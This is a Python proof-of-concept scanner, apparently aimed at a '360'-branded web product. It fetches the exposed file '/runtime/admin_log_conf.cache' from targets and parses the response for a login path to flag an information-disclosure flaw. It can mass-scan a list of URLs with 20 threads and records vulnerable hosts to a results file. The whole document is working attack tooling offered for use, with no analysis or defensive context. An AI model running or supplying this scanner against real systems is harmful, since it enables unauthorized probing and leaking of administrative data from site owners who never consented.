import argparse,requests
import re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """"
     ______   ______   ______   ______   _________  
    /_____/\ /_____/\ /_____/\ /_____/\ /________/\ 
    \:::_:\ \\:::__\/ \:::_ \ \\:::_ \ \\__.::.__\/ 
       /_\:\ \\:\ \____\:\ \ \ \\:\ \ \ \_ \::\ \   
       \::_:\ \\::__::/\\:\ \ \ \\:\ \ /_ \ \::\ \  
       /___\:\ '\:\_\:\ \\:\_\ \ \\:\_-  \ \ \::\ \ 
       \______/  \_____\/ \_____\/ \___|\_\_/ \__\/ 
                                                
"""
    print(test)
def poc(target):
    payload = "/runtime/admin_log_conf.cache"
    headers = {
        "User-Agent":"Mozilla/5.0 (windows NT 10.0; Win64; x64;rv:128.0) Gecko/20100101 Firefox/128.0"
    }
    try:
        res1 = requests.get(url=target+payload, timeout=10, headers=headers,verify=False)
        # if res1.status_code == 200:
        #     res2 =requests.get(url=target+payload,headers=headers,verify=False)
        content = re.findall(r's:12:"(.*?)";',res1.text,re.S)
        if "/login/login" in content:
            with open("360_result.txt","a",encoding='utf-8') as f:
                f.write(f"[+]{target}存在漏洞\n")
                print(f"[+]{target}存在漏洞")
        elif res1.status_code == 200:
            print(f"该{target}可能存在问题，请手动测试")
        else:
            print(f"[-]{target}不存在漏洞")

    except Exception as e:
        print(e)
def main():
    banner()
    parser = argparse.ArgumentParser(description="360")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter the target url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter the target file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp =Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print("您的输入有误")




if __name__ == '__main__':
    main()